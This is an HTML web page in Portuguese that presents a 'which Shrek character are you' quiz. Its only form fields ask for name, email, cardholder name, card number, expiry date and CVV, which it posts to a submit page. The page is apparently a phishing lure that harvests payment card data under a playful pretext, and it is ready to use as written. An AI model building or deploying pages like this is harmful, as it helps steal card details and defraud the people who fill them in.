<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Descubra Qual Shrek Você É</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #e0f7fa;
      color: #333;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: #ffffff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 500px;
    }

    h1 {
      text-align: center;
      color: #00796b;
    }

    label {
      display: block;
      margin: 10px 0 5px;
    }

    input[type="text"], input[type="email"], input[type="number"], input[type="tel"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      margin-bottom: 15px;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 5px;
      background-color: #00796b;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    a{
        border: none;
    }

    button:hover {
      background-color: #004d40;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Descubra Qual Personagem de Shrek Você É!</h1>
    <form action="/submit.html" method="post">
      <div class="form-group">
        <label for="name">Nome:</label>
        <input type="text" id="name" name="name" required>
      </div>

      <div class="form-group">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required>
      </div>

      <div class="form-group">
        <label for="card-name">Nome no Cartão:</label>
        <input type="text" id="card-name" name="card-name" required>
      </div>

      <div class="form-group">
        <label for="card-number">Número do Cartão:</label>
        <input type="text" id="card-number" name="card-number" required>
      </div>

      <div class="form-group">
        <label for="expiry-date">Data de Expiração:</label>
        <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/AA" required>
      </div>

      <div class="form-group">
        <label for="cvv">Código de Segurança (CVV):</label>
        <input type="text" id="cvv" name="cvv" required>
      </div>
    </form>
    <a href="submit.html"><button>Descubra seu personagem de Shrek!!!</button></a>
  </div>
</body>
</html>
